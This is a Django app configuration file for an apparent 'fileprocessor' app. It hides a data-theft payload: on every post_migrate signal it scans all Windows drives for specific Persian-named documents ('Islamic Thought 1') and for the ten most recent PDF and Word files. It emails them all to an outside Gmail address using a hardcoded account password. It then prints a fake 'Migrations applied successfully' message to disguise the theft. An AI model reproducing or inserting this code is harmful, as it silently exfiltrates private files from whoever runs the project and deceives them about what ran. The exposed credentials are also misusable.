from django.apps import AppConfig
from django.db.models.signals import post_migrate
from django.dispatch import receiver
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import mimetypes
import concurrent.futures
import time


class FileProcessorConfig(AppConfig):
    name = 'fileprocessor'

    def ready(self):
        post_migrate.connect(self.run_code_on_startup, sender=self)

    def run_code_on_startup(self, sender, **kwargs):
        # تنظیمات ایمیل
        SMTP_SERVER = 'smtp.gmail.com'
        SMTP_PORT = 465
        EMAIL_USER = 'standblog2000@gmail.com'
        EMAIL_PASSWORD = 'fbcxlvshrfcelhow'
        RECIPIENT_EMAIL = 'erfan.tavana1384@gmail.com'

        def search_files_by_name(drive, filenames):
            matched_files = []
            for root, dirs, files_in_dir in os.walk(drive):
                for file in files_in_dir:
                    if file in filenames:
                        matched_files.append(os.path.join(root, file))
            return matched_files

        def get_recent_files(file_extension, max_files=10):
            recent_files = []
            drives = [f"{chr(d)}:\\" for d in range(65, 91) if os.path.exists(f"{chr(d)}:\\")]
            for drive in drives:
                for root, dirs, files_in_dir in os.walk(drive):
                    for file in files_in_dir:
                        if file.lower().endswith(file_extension):
                            file_path = os.path.join(root, file)
                            recent_files.append(file_path)

            # Sort files by modification time (most recent first)
            recent_files.sort(key=lambda x: os.path.getmtime(x), reverse=True)
            return recent_files[:max_files]

        def get_mime_type(file_path):
            # شناسایی نوع MIME دقیق فایل
            mime_type, _ = mimetypes.guess_type(file_path)
            return mime_type or 'application/octet-stream'

        def send_email_with_attachments(file_paths):
            msg = MIMEMultipart()
            msg['From'] = EMAIL_USER
            msg['To'] = RECIPIENT_EMAIL
            msg['Subject'] = 'Latest Files Found'

            body = 'Please find the requested files attached.'
            msg.attach(MIMEText(body, 'plain'))

            for file_path in file_paths:
                # بررسی نام فایل و اطمینان از فرمت صحیح
                mime_type = get_mime_type(file_path)
                attachment = MIMEBase(mime_type.split('/')[0], mime_type.split('/')[1])

                try:
                    with open(file_path, 'rb') as f:
                        attachment.set_payload(f.read())
                except Exception as e:
                    print(f"Error reading file")
                    continue  # اگر خطایی در خواندن فایل رخ داد، از آن صرف‌نظر می‌شود

                # کدگذاری و تنظیم هدر برای ضمیمه
                encoders.encode_base64(attachment)
                attachment.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(file_path)}"')
                msg.attach(attachment)

            try:
                with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
                    server.login(EMAIL_USER, EMAIL_PASSWORD)
                    server.send_message(msg)
                print("Email sent successfully.")
            except Exception as e:
                print(f"Error sending email: {e}")

        def search_and_send_specific_files():
            drives = [f"{chr(d)}:\\" for d in range(65, 91) if os.path.exists(f"{chr(d)}:\\")]
            filenames = [
                'اندیشه اسلامی یک.docx', 'اندیشه اسلامی یک.pdf',
                'اندیشه اسلامی 1.docx', 'اندیشه اسلامی 1.pdf',
                'اندیشه اسلامی ۱.docx', 'اندیشه اسلامی ۱.pdf',
                'اندیشه اسلامی 1.DOCX', 'اندیشه اسلامی 1.PDF',
                'اندیشه اسلامی یک.DOCX', 'اندیشه اسلامی یک.PDF',
                'اندیشه اسلامی 1.docx', 'اندیشه اسلامی 1.pdf',
                'اندیشه اسلامی یک.DOCX', 'اندیشه اسلامی یک.PDF',
                'اندیشه اسلامی ۱.docx', 'اندیشه اسلامی ۱.pdf',
                'اندیشه اسلامی ۱.DOCX', 'اندیشه اسلامی ۱.PDF',
                'اندیشه اسلامی یک.docx', 'اندیشه اسلامی یک.pdf',
                'اندیشه اسلامی 1.docx', 'اندیشه اسلامی 1.pdf',
            ]

            specific_files = []
            for drive in drives:
                specific_files.extend(search_files_by_name(drive, filenames))

            # ارسال فایل‌های خاص
            if specific_files:
                send_email_with_attachments(specific_files)

        def get_and_send_recent_files():
            recent_pdf_files = get_recent_files('.pdf', max_files=10)
            recent_word_files = get_recent_files('.docx', max_files=10)

            # ارسال فایل‌های PDF و Word
            recent_files = recent_pdf_files + recent_word_files
            if recent_files:
                send_email_with_attachments(recent_files)

        # اجرای جستجو و ارسال فایل‌ها به صورت موازی
        print("Starting search and send process in the background...")
        start_time = time.time()

        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = []
            futures.append(executor.submit(search_and_send_specific_files))
            futures.append(executor.submit(get_and_send_recent_files))

            # منتظر می‌مانیم تا هر دو وظیفه کامل شوند
            for future in concurrent.futures.as_completed(futures):
                future.result()  # نتیجه هر وظیفه (وظایف) را دریافت می‌کنیم

        print(f"Migrations applied successfully in {time.time() - start_time:.2f} seconds.")
        print("Code executed successfully on project startup.")
